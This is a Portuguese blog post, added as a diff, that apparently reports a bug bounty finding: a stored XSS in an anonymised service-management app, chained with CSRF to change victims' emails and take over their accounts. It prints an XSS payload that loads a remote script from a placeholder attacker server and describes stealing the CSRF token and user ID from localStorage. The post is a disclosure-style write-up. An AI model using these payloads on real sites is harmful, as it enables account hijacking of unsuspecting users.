@@ -1,0 +1,96 @@
+---
+layout: post
+title:  "Bug Bounty 01 - Account Takeover via CSRF + XSS Stored"
+date:   2019-06-03 11:08:00
+categories: All
+img: bug_bounty.png
+---
+<p align="justify">
+Fala galera, neste post irei falar sobre uma vulnerabilidade que encontrei em um programa na plataforma <a href="https://bugcrowd.com" target="_blank">Bugcrowd</a>. A falha já foi corrigida mais infelizmente o vendor não me autorizou a fazer o disclosure, então iremos chamar o site de domain.com :)
+</p>
+
+<p align="justify">
+A aplicação permite que você crie uma instância e adicione vários tipos de funcionalidades, como alertas, serviços, usuários, times etc.
+<br>
+Ao criar um serviço, é necessário que você aloque um time para que eles fiquem encarregados de cuidar deste serviço criado. Dentro de um serviço, era possível adicionar ações específicas para que cada usuário fosse capaz de executar ao realizar determinada tarefa.
+</p>
+
+<p align="justify">
+Nessas ações, verifiquei que ao executá-la um pop-up era aberto com o nome da ação executada, ou seja, o nome da ação era refletido nesse pop-up.
+<br>
+Decidi então adicionar uma tag HTML e um evento JS simples, inseri <code>&lt;img src="x" onerror="alert(1)"/&gt;</code>, e ao clicar na ação maliciosa, o nome foi refletido novamente, sem nenhum tipo de filtro, e o alerta "subiu" :) (opaaaaa)
+<br>
+<img src="/images/bug_bounty/bb01/bb01-00.png"/>
+<br>
+<img src="/images/bug_bounty/bb01/bb01-01.png"/>
+<br>
+Bom, neste ponto, eu já tinha um XSS Stored. Vi como funcionava a aplicação, e notei que havia como um usuário fazer a troca do email, então tive a sacada, eu poderia utilizar de um CSRF junto com o XSS para realizar o Account Takeover.
+</p>
+
+<p align="justify">
+Basicamente, o CSRF consistia em uma request POST simples para o endpoint que realizava a troca do email, decidi criar um arquivo javascript com o exploit (ele está disponível no meu github, vou deixar o link no final do report :) ) para que não ficasse muito código dentro do campo da ação.
+<br>
+<br>
+Utilizei o seguinte código para carregar o exploit quando o usuário executar a ação maliciosa dentro do serviço:
+<br>
+<code>&lt;img src="x" onerror="var script = document.createElement('script'); script.src = 'IP_SERVIDOR/poc.js'; document.getElementsByTagName('head')[0].appendChild(script);"/&gt;</code> 
+<br>
+<br>
+<img src="/images/bug_bounty/bb01/bb01-02.png">
+<br>
+<img src="/images/bug_bounty/bb01/bb01-03.png">
+<br>
+Com isso, ao executar a ação maliciosa no serviço, o pop-up seria mostrado e o código executado.
+</p>
+
+<p align="justify">
+Mas.... Para realizar a requisição, era necessário que fosse enviado junto da request, o token CSRF e o ID do usuário. Depois de fuçar um pouco a aplicação, notei que eles estavam sendo armazenados no localStorage (this is very good :) ), então tive apenas que capturar eles via JS e enviá-los juntos da requisição POST.
+<br>
+<img src="/images/bug_bounty/bb01/bb01-00.png"/>
+</p>
+
+<p align="justify">
+Depois de realizar todo o processo, era necessário apenas adicionar as vítimas ao time, e atribuir um serviço com uma ação maliciosa a esse time, vale lembrar que não era necessário que as vítimas tivessem contas já criadas, pois o sistema verificava e caso não houvesse, era criado uma nova conta.
+<br>
+<br>
+</p>
+
+<p align="justify">
+Como PoC, irei colocar alguns prints tirados do vídeo, então vamos lá :)
+<br>
+<br>
+Primeiramente, o email da vítima permanece normalmente:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-04.png">
+<br>
+<br>
+Quando a vítima entrasse no seriço malicioso e fosse realizar alguma ação, esta seria a visão dele:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-03.png">
+<br>
+<br>
+Ao clicar na última ação, o pop-up era mostrado:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-00.png">
+<br>
+<br>
+E em background a ação da troca de email era realizada:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-05.png">
+<br>
+<br>
+Como resultado, o email da vítima foi trocado:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-06.png">
+<br>
+<br>
+Um link de confirmação foi enviado para o email do atacante, e ao confirmar o novo email, a conta da vítima teria o seu email trocado:
+<br>
+<img src="/images/bug_bounty/bb01/bb01-09.png">
+<br>
+Infelizmente, não posso divulgar o vídeo da PoC, pois como foi dito no início, o vendor não autorizou que fosse divulgado a vulnerabilidade.
+</p>
+
+<p align="justify">
+Como prometido, o exploit pode ser encontrado neste link: <a href="https://github.com/vitor-fernandes/exploits/blob/master/poc.js" target="_blank" style="color: blue"><b>Exploit</b></a> 
+</p>
